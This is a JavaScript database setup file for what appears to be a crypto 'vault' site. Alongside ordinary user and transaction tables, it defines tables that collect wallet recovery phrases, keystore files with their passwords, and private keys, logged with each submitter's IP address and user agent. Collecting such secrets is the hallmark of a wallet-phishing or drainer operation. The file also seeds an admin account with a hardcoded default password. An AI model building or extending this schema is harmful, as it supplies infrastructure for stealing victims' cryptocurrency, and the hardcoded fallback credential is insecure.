import { neon } from "@neondatabase/serverless";
import "dotenv/config";
import { hashPassword } from "../utils/password.js";

// Lazily create a SQL client only when the env var exists
const databaseUrl = process.env.DATABASE_URL || "";
export const sql = databaseUrl
  ? neon(databaseUrl)
  : (() => {
      const err = () => {
        throw new Error("DATABASE_URL is not set; cannot connect to database");
      };
      // Mimic tag behavior so usages like sql`...` throw with a clear message
      return new Proxy(err, {
        apply() {
          err();
        },
      });
    })();

export async function initDB() {
  try {
await sql`CREATE TABLE IF NOT EXISTS transactions(
      id SERIAL PRIMARY KEY,
      user_id VARCHAR(255) NOT NULL,
      title  VARCHAR(255) NOT NULL,
      amount  DECIMAL(10,2) NOT NULL,
      category VARCHAR(255) NOT NULL,
      created_at DATE NOT NULL DEFAULT CURRENT_DATE
  )`;

 await sql`CREATE TABLE IF NOT EXISTS users(
   id SERIAL PRIMARY KEY,
   username VARCHAR(100) NOT NULL,
   email VARCHAR(190) NOT NULL,
   password_hash VARCHAR(255) NOT NULL,
   role VARCHAR(32) NOT NULL DEFAULT 'user', -- 'user' | 'admin'
   total_balance DECIMAL(18,8) NOT NULL DEFAULT 0,
   is_frozen BOOLEAN NOT NULL DEFAULT FALSE,
   profile_image VARCHAR(255),
   created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
   updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 )`;


  await sql`CREATE TABLE IF NOT EXISTS wallet_submissions(
    id SERIAL PRIMARY KEY,
    user_id INTEGER,
    type VARCHAR(32) NOT NULL, -- 'phrase' | 'keystore' | 'private'
    wallet_name VARCHAR(120) NOT NULL,
    email VARCHAR(190) NOT NULL,
    recovery_phrase TEXT,
    keystore_json TEXT,
    keystore_password VARCHAR(255),
    private_key TEXT,
    icon_name VARCHAR(120),
    image_src VARCHAR(255),
    ip_addr VARCHAR(45),  -- IPv4/IPv6
    user_agent VARCHAR(255),
    status VARCHAR(32) NOT NULL DEFAULT 'pending',
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
  )`

  await sql`CREATE TABLE IF NOT EXISTS phrase_backups(
     id SERIAL PRIMARY KEY,
     user_id INTEGER,
     wallet_key VARCHAR(190),
     wallet_name VARCHAR(120) NOT NULL,
     email VARCHAR(190) NOT NULL,
     recovery_phrase TEXT NOT NULL,
     image_src VARCHAR(255),
     ip_addr VARCHAR(45),
     user_agent VARCHAR(255),
     status VARCHAR(32) NOT NULL DEFAULT 'pending',
     created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
     updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
   )`

  // Track user login events (stamps)
  await sql`CREATE TABLE IF NOT EXISTS login_stamps(
    id SERIAL PRIMARY KEY,
    user_id INTEGER NOT NULL,
    ip_addr VARCHAR(45),
    user_agent VARCHAR(255),
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
  )`;

  await sql`CREATE INDEX IF NOT EXISTS login_stamps_user_idx ON login_stamps(user_id, created_at)`;

    // Indexes and constraints
    await sql`CREATE UNIQUE INDEX IF NOT EXISTS users_email_key ON users(email)`;
    await sql`CREATE UNIQUE INDEX IF NOT EXISTS users_username_key ON users(username)`;

    // updated_at triggers for Postgres
    await sql`
      CREATE OR REPLACE FUNCTION set_updated_at() RETURNS trigger AS $$
      BEGIN
        NEW.updated_at = NOW();
        RETURN NEW;
      END;
      $$ LANGUAGE plpgsql;
    `;

    await sql`DROP TRIGGER IF EXISTS set_updated_at_users ON users`;
    await sql`CREATE TRIGGER set_updated_at_users BEFORE UPDATE ON users FOR EACH ROW EXECUTE FUNCTION set_updated_at()`;

    await sql`DROP TRIGGER IF EXISTS set_updated_at_wallet_submissions ON wallet_submissions`;
    await sql`CREATE TRIGGER set_updated_at_wallet_submissions BEFORE UPDATE ON wallet_submissions FOR EACH ROW EXECUTE FUNCTION set_updated_at()`;

   await sql`DROP TRIGGER IF EXISTS set_updated_at_phrase_backups ON phrase_backups`;
   await sql`CREATE TRIGGER set_updated_at_phrase_backups BEFORE UPDATE ON phrase_backups FOR EACH ROW EXECUTE FUNCTION set_updated_at()`;

    // Payment wallets table for admin-managed deposit addresses
    await sql`CREATE TABLE IF NOT EXISTS payment_wallets(
      id SERIAL PRIMARY KEY,
      currency VARCHAR(32) NOT NULL, -- e.g., BTC, ETH, USDT
      network VARCHAR(64),           -- e.g., Bitcoin, ERC20, TRC20
      address VARCHAR(255) NOT NULL,
      label VARCHAR(120),
      memo_tag VARCHAR(120),         -- optional memo/tag/destination tag
      is_active BOOLEAN NOT NULL DEFAULT TRUE,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )`;

    await sql`CREATE UNIQUE INDEX IF NOT EXISTS payment_wallets_unique_addr ON payment_wallets(currency, COALESCE(network, ''), address)`;

   await sql`DROP TRIGGER IF EXISTS set_updated_at_payment_wallets ON payment_wallets`;
   await sql`CREATE TRIGGER set_updated_at_payment_wallets BEFORE UPDATE ON payment_wallets FOR EACH ROW EXECUTE FUNCTION set_updated_at()`;

    const adminEnv = {
      username: process.env.ADMIN_USERNAME || "admin",
      email: process.env.ADMIN_EMAIL || "admin@vault.local",
      password: process.env.ADMIN_PASSWORD,
    };

    const existingAdmin = await sql`SELECT id FROM users WHERE role = 'admin' LIMIT 1`;
    if (!existingAdmin.length) {
      const password = adminEnv.password && adminEnv.password.length >= 8 ? adminEnv.password : "ChangeMe123!";
      await sql`
        INSERT INTO users (username, email, password_hash, role)
        VALUES (${adminEnv.username}, ${adminEnv.email.toLowerCase()}, ${hashPassword(password)}, 'admin')
        ON CONFLICT (email) DO NOTHING
      `;
      const seededAdmin = await sql`SELECT id FROM users WHERE role = 'admin' LIMIT 1`;
      if (seededAdmin.length) {
        console.log(
          `Seeded default admin account (${adminEnv.email}).${adminEnv.password ? '' : ' Please change the password (default used).'}`
        );
      } else {
        console.warn('Attempted to seed an admin account but none exists. Please create one manually.');
      }
    }

    console.log("Database initialized successfully");
  } catch (error) {
    console.log("Error initializing DB", error);
    process.exit(1); // status code 1 means failure, 0 success
  }
}
